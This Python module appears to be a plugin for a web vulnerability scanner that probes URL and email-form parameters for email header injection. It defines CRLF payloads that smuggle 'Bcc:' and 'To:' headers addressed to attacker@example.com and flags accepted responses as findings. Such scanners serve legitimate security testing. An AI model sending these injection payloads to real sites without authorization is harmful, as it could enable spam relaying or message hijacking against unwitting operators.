"""Email header injection / SMTP injection."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse

PAYLOADS = [
    "test@example.com%0d%0aBcc: attacker@example.com",
    "test@example.com\nBcc: attacker@example.com",
    "test@example.com%0aTo: attacker@example.com",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    # common email params
    email_params = ["email", "to", "from", "recipient", "mail", "contact", "sender"]
    for param in test_params + [p for p in email_params if p not in test_params]:
        for payload in PAYLOADS:
            q = dict(qs)
            q[param] = [payload]
            new_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            r = get(new_url)
            if r.status == 0:
                continue
            # if server accepted (200) and no validation error
            if r.status == 200 and "invalid" not in (r.text or "").lower() and "error" not in (r.text or "").lower():
                findings.append(Finding(
                    id="emailinj-{}-{}".format(param, hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="Email Header Injection",
                    severity="medium",
                    url=new_url,
                    parameter=param,
                    payload=payload,
                    evidence="Email param accepted with CRLF",
                    response_snippet=r.snippet(200),
                    confidence=0.4,
                ))
                break
    log_event(parsed.netloc, "email_injection_scan", {"url": url, "findings": len(findings)})
    return findings
